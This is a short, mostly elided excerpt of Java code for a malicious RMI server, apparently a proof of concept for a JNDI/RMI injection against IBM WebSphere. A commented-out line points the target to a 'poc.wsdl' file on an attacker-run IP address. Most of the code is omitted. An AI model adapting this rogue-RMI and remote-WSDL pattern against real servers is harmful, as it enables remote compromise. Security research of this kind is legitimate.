...
// javac -cp .:plugins/com.ibm.ws.runtime.jar:runtimes/com.ibm.ws.admin.client_9.0.jar --add-modules jdk.naming.rmi --add-exports='jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED' RMIServer.java
...
public class RMIServer {
    public static void main(String[] args) throws Exception {
        ...
        //ref.add(new StringRefAddr("wsdlLoc", "http://172.16.205.1:8000/poc.wsdl"));
